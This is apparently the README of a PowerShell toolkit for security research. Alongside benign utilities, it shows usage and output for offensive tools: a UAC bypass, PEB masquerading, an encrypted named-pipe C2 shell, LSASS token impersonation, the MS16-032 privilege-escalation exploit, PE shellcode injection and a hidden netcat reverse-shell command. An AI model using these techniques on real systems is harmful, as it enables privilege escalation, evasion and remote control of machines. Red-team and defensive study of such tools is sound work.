# PowerShell-Suite

There are great tools and resources online to accomplish most any task in PowerShell, sometimes however, there is a need to script together a util for a specific purpose or to bridge an ontological gap. This is a collection of PowerShell utilities I put together either for fun or because I had a narrow application in mind.

As such the mileage you get out of them may vary but feel free to post issues or fork & adapt!

## Windows API

Some resources to consult on Windows API access from PowerShell:
* FuzzySecurity: [Low-Level Windows API Access From PowerShell](http://www.fuzzysecurity.com/tutorials/24.html)
* Microsoft TechNet: [Use PowerShell to Interact with the Windows API](https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/)
* Exploit Monday: [Accessing the Windows API in PowerShell via internal .NET methods and reflection](http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html)
* Exploit Monday: [Deep Reflection - Defining Structs and Enums in PowerShell](http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html)

### Invoke-Runas

Functionally equivalent to Windows "runas.exe", using Advapi32::CreateProcessWithLogonW.

```
Start cmd with a local account.
C:\PS> Invoke-Runas -User SomeAccount -Password SomePass -Binary C:\Windows\System32\cmd.exe -LogonType 0x1

Start cmd with remote credentials. Equivalent to "/netonly" in runas.
C:\PS> Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType 0x2
```

### Invoke-NetSessionEnum

Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines.

```
Enumerate active sessions on "SomeHostName".
C:\PS> Invoke-NetSessionEnum -HostName SomeHostName
```

### Invoke-CreateProcess

Use Kernel32::CreateProcess to achieve fine-grained control over process creation from PowerShell.

```
Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOW
C:\PS> Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 0x0 -ShowWindow 0x1 -StartF 0x1

Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW
C:\PS> Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args "-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe" -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1
```

### Detect-Debug

Showcase a number of techniques to detect the presence of Kernel/User-Mode debuggers from PowerShell.

```
Sample below is x64 Win8, WinDbg attached to PowerShell.
C:\PS> Detect-Debug

[+] Detect Kernel-Mode Debugging
    [?] SystemKernelDebuggerInformation: False

[+] Detect User-Mode Debugging
    [?] CloseHandle Exception: Detected
    [?] IsDebuggerPresent: Detected
    [?] CheckRemoteDebuggerPresent: Detected
    [?] PEB!BeingDebugged: Detected
    [?] PEB!NtGlobalFlag: Detected
    [?] DebugSelf: Detected
```

### Get-Handles

Use NtQuerySystemInformation::SystemHandleInformation to get a list of open handles in the specified process, works on x32/x64.

```
Get handles for PID 2288
C:\PS> Get-Handles -ProcID 2288

[>] PID 2288 --> notepad
[+] Calling NtQuerySystemInformation::SystemHandleInformation
[?] Success, allocated 449300 byte result buffer

[>] Result buffer contains 28081 SystemHandleInformation objects
[>] PID 2288 has 71 handle objects

 PID ObjectType      HandleFlags        Handle KernelPointer AccessMask
 --- ----------      -----------        ------ ------------- ----------
2288 Directory       NONE               0x0004 0x88E629F0    0x00000000
2288 File            NONE               0x0008 0x84560C98    0x00100000
2288 File            NONE               0x000C 0x846164F0    0x00100000
2288 Key             NONE               0x0010 0xA3067A80    0x00020000
2288 ALPC Port       NONE               0x0014 0x8480C810    0x001F0000
2288 Mutant          NONE               0x0018 0x8591FEB8    0x001F0000
2288 Key             NONE               0x001C 0x96719C48    0x00020000
2288 Event           NONE               0x0020 0x850C6838    0x001F0000
...Snip...
```

### Get-TokenPrivs

Open a handle to a process and use Advapi32::GetTokenInformation to list the privileges associated with the process token.

```
Get token privileges for PID 3836
C:\PS> Get-TokenPrivs -ProcID 3836

[?] PID 3836 --> calc
[+] Process handle: 1428
[+] Token handle: 1028
[+] Token has 5 privileges:

LUID Privilege
---- ---------
  19 SeShutdownPrivilege
  23 SeChangeNotifyPrivilege
  25 SeUndockPrivilege
  33 SeIncreaseWorkingSetPrivilege
  34 SeTimeZonePrivilege
```

### Get-Exports

Get-Exports, fetches DLL exports and optionally provides C++ wrapper output (idential to ExportsToC++ but without needing VS and a compiled binary). To do this it reads DLL bytes into memory and then parses them (no LoadLibraryEx). Because of this you can parse x32/x64 DLL's regardless of the bitness of PowerShell.

```
PS C:\> Get-Exports -DllPath C:\Windows\System32\ubpm.dll

[?] 32-bit Image!

[>] Time Stamp: 07/15/2016 18:07:55
[>] Function Count: 16
[>] Named Functions: 16
[>] Ordinal Base: 1
[>] Function Array RVA: 0x2F578
[>] Name Array RVA: 0x2F5B8
[>] Ordinal Array RVA: 0x2F5F8

Ordinal ImageRVA   FunctionName
------- --------   ------------
      1 0x000242A0 UbpmAcquireJobBackgroundMode
      2 0x00004750 UbpmApiBufferFree
      3 0x00004E30 UbpmCloseTriggerConsumer
      4 0x000135E0 UbpmInitialize
      5 0x00008D00 UbpmOpenTriggerConsumer
      6 0x000242C0 UbpmReleaseJobBackgroundMode
      7 0x00013230 UbpmSessionStateChanged
      8 0x000242E0 UbpmTerminate
      9 0x00003BD0 UbpmTriggerConsumerConfigure
     10 0x000040C0 UbpmTriggerConsumerControl
     11 0x00025B10 UbpmTriggerConsumerControlNotifications
     12 0x00025B40 UbpmTriggerConsumerQueryStatus
     13 0x0000E1B0 UbpmTriggerConsumerRegister
     14 0x000043F0 UbpmTriggerConsumerSetDisabledForUser
     15 0x00012480 UbpmTriggerConsumerSetStatePublishingSecurity
     16 0x00005330 UbpmTriggerConsumerUnregister
```

## pwnd

### Bypass-UAC

Bypass-UAC provides a framework to perform UAC bypasses based on auto elevating IFileOperation COM object method calls. This is not a new technique, traditionally, this is accomplished by injecting a DLL into “explorer.exe”. This is not desirable because injecting into explorer may trigger security alerts and working with unmanaged DLL’s makes for an inflexible work-flow.

To get around this, Bypass-UAC implements a function which rewrites PowerShell’s PEB to give it the appearance of “explorer.exe”. This provides the same effect because COM objects exclusively rely on Windows’s Process Status API (PSAPI) which reads the process PEB.

```
C:\PS> Bypass-UAC -Method ucmDismMethod

[!] Impersonating explorer.exe!
[+] PebBaseAddress: 0x000007F73E93F000
[!] RtlEnterCriticalSection --> &Peb->FastPebLock
[>] Overwriting &Peb->ProcessParameters.ImagePathName: 0x000000569B5F1780
[>] Overwriting &Peb->ProcessParameters.CommandLine: 0x000000569B5F1790
[?] Traversing &Peb->Ldr->InLoadOrderModuleList doubly linked list
[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x000000569B5F2208
[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x000000569B5F2218
[!] RtlLeaveCriticalSection --> &Peb->FastPebLock

[>] Dropping proxy dll..
[+] 64-bit Yamabiko: C:\Users\b33f\AppData\Local\Temp\yam1730961377.tmp
[>] Creating XML trigger: C:\Users\b33f\AppData\Local\Temp\pac500602004.xml
[>] Performing elevated IFileOperation::MoveItem operation..

[?] Executing PkgMgr..
[!] UAC artifact: C:\Windows\System32\dismcore.dll
[!] UAC artifact: C:\Users\b33f\AppData\Local\Temp\pac500602004.xml
```

### Masquerade-PEB

Masquerade-PEB uses NtQueryInformationProcess to get a handle to powershell's PEB. From there it replaces a number of UNICODE_STRING structs in memory to give powershell the appearance of a different process. Specifically, the function will overwrite powershell's "ImagePathName" & "CommandLine" in _RTL_USER_PROCESS_PARAMETERS and the "FullDllName" & "BaseDllName" in the _LDR_DATA_TABLE_ENTRY linked list.
    
This can be useful as it would fool any Windows work-flows which rely solely on the Process Status API to check process identity.

```
C:\PS> Masquerade-PEB -BinPath C:\Windows\System32\notepad.exe

[?] PID 2756
[+] PebBaseAddress: 0x7FFD3000
[!] RtlEnterCriticalSection --> &Peb->FastPebLock
[>] Overwriting &Peb->ProcessParameters.ImagePathName: 0x002F11F8
[>] Overwriting &Peb->ProcessParameters.CommandLine: 0x002F1200
[?] Traversing &Peb->Ldr->InLoadOrderModuleList doubly linked list
[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x002F1B74
[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x002F1B7C
[!] RtlLeaveCriticalSection --> &Peb->FastPebLock
```

### Invoke-SMBShell

POC shell using named pipes (System.IO.Pipes) as a C2 channel. The SMB traffic is encrypted using AES CBC (code from Empire), the key/pipe are generated randomly by the server on start-up.

**Server:**
```
PS C:\> Invoke-SMBShell

+-------
| Host Name: 0AK
| Named Pipe: tapsrv.5604.yk0DxXvjUD9xwyJ9
| AES Key: q6EKfuJTX93YUnmX
+-------

[>] Waiting for client..


SMB shell: whoami
0ak\b33f

SMB shell: IdontExist
The term 'IdontExist' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.

SMB shell: $PSVersionTable
Name                           Value
----                           -----
PSRemotingProtocolVersion      2.2
BuildVersion                   6.2.9200.17065
PSCompatibleVersions           {1.0, 2.0, 3.0}
PSVersion                      3.0
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
SerializationVersion           1.1.0.1

SMB shell: leave

[!] Client disconnecting..

[>] Waiting for client..


SMB shell: calc
Job SMBJob-dVkIkAkXINjMe09S completed successfully!

SMB shell: exit

[!] Client disconnecting..
[!] Terminating server..

PS C:\>
```

**Client:**
```
# Client disconnected because of "leave" command
PS C:\> Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9
# Client disconnected because "exit" command kills client/server
PS C:\> Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9
```

### Conjure-LSASS

Use the SeDebugPrivilege to duplicate the LSASS access token and impersonate it in the calling thread. If SeDebugPrivilege is disabled the function will re-enable it.

```
Conjure LSASS into our midst! ;)
C:\PS> Conjure-LSASS

[?] SeDebugPrivilege is available!

[+] Current process handle: 852

[>] Calling Advapi32::OpenProcessToken
[+] Token handle with TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY: 2000

[?] SeDebugPrivilege is enabled!

[>] Calling Advapi32::OpenProcessToken --> LSASS
[+] Token handle with TOKEN_IMPERSONATE|TOKEN_DUPLICATE: 1512

[>] Calling Advapi32::DuplicateToken --> LSASS
[+] Duplicate token handle with SecurityImpersonation level: 2008

[>] Calling Advapi32::SetThreadToken
[+] Knock knock .. who's there .. LSASS
[+] User context: SYSTEM

C:\PS> whoami
ERROR: Access is denied.
ERROR: Access is denied.

C:\PS> Get-ChildItem -Path hklm:SAM

    Hive: HKEY_LOCAL_MACHINE\SAM


SKC  VC Name                           Property
---  -- ----                           --------
  3   2 SAM                            {C, ServerDomainUpdates}
```

### Invoke-MS16-032

PowerShell implementation of MS16-032. The exploit targets all vulnerable operating systems that support PowerShell v2+. Credit for the discovery of the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
    
Targets:

* Win7-Win10 & 2k8-2k12 <== 32/64 bit!
* Tested on x32 Win7, x64 Win8, x64 2k12R2

==> Not tested on Vista with PowerShell v1, let me know what happens if you are able to check this!

```
Sit back and watch the pwn!
C:\PS> Invoke-MS16-032
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 956

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 964
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

```

### Subvert-PE

Inject shellcode into a PE image while retaining the PE functionality.

For additional information, please refer to:

* FuzzySecurity: [Powershell PE Injection, this is not the Calc you are looking for!](http://www.fuzzysecurity.com/tutorials/20.html)

```
Analyse the PE header and hexdump the region of memory where shellcode would be injected.
C:\PS> Subvert-PE -Path C:\Path\To\PE.exe

Same as above but continue to inject shellcode and overwrite the binary.
C:\PS> Subvert-PE -Path C:\Path\To\PE.exe -Write
```

## Utility

### Trace-Execution

Uses the Capstone engine to recursively disassemble a PE (x32/x64) from it's entry point, effectively "following" execution flow. The following rules are observed:

- jmp's are taken if they fall in the PE address space
- call's are taken if they fall in the PE address space
- ret's are taken and use the return address stored by call instructions
- indirect call/jmp's are not taken
- conditional jmp's are not taken
- call/jmp's which reference a register are not taken

There are many many edge cases here which can make disassembly unreliable. As a general rule, the more addresses you disassemble, the less trustworthy the output is. The call table can be used as a reference to gauge the veracity of the output.

Since disassembly is static, working of a byte array, x32/x64 PE's can be disassembled regardless of the bitness of PowerShell.

```
PS C:\> Trace-Execution -Path .\Desktop\some.exe -InstructionCount 10

[>] 32-bit Image!

[?] Call table:

Address    Mnemonic Taken Reason
-------    -------- ----- ------
0x4AD0829A call     Yes   Relative offset call
0x4AD07CB7 call     No    Indirect call

[?] Instruction trace:

Size Address    Mnemonic Operands                    Bytes                   RegRead  RegWrite
---- -------    -------- --------                    -----                   -------  --------
   5 0x4AD0829A call     0x4ad07c89                  {232, 234, 249, 255...} {esp}
   2 0x4AD07C89 mov      edi, edi                    {139, 255, 249, 255...}
   1 0x4AD07C8B push     ebp                         {85, 255, 249, 255...}  {esp}    {esp}
   2 0x4AD07C8C mov      ebp, esp                    {139, 236, 249, 255...}
   3 0x4AD07C8E sub      esp, 0x10                   {131, 236, 16, 255...}           {eflags}
   5 0x4AD07C91 mov      eax, dword ptr [0x4ad240ac] {161, 172, 64, 210...}
   4 0x4AD07C96 and      dword ptr [ebp - 8], 0      {131, 101, 248, 0...}            {eflags}
   4 0x4AD07C9A and      dword ptr [ebp - 4], 0      {131, 101, 252, 0...}            {eflags}
   1 0x4AD07C9E push     ebx                         {83, 101, 252, 0...}    {esp}    {esp}
   1 0x4AD07C9F push     edi                         {87, 101, 252, 0...}    {esp}    {esp}
   5 0x4AD07CA0 mov      edi, 0xbb40e64e             {191, 78, 230, 64...}
   5 0x4AD07CA5 mov      ebx, 0xffff0000             {187, 0, 0, 255...}
   2 0x4AD07CAA cmp      eax, edi                    {59, 199, 0, 255...}             {eflags}
   6 0x4AD07CAC jne      0x4ad1bc8c                  {15, 133, 218, 63...}   {eflags}
   1 0x4AD07CB2 push     esi                         {86, 133, 218, 63...}   {esp}    {esp}
   3 0x4AD07CB3 lea      eax, dword ptr [ebp - 8]    {141, 69, 248, 63...}
   1 0x4AD07CB6 push     eax                         {80, 69, 248, 63...}    {esp}    {esp}
   6 0x4AD07CB7 call     dword ptr [0x4ad01150]      {255, 21, 80, 17...}    {esp}
   3 0x4AD07CBD mov      esi, dword ptr [ebp - 4]    {139, 117, 252, 0...}
   3 0x4AD07CC0 xor      esi, dword ptr [ebp - 8]    {51, 117, 248, 0...}             {eflags}
```

### Calculate-Hash

PowerShell v2 compatible script to calculate file hashes. I quickly scripted this together because Get-FileHash is only available in v4+.

```
Get the SHA512 hash of "C:\Some\File.path".
C:\PS> Calculate-Hash -Path C:\Some\File.path -Algorithm SHA512
```

### Check-VTFile

Submit SHA256 hash of a file to Virus Total and retrieve the scan report if the hash is known. This requires you to get a, free, VirusTotal API key. Again, lot's of better projects out there for this but not PowerShell v2 compatible.

```
C:\PS> Check-VTFile -Path C:\Some\File.path
```
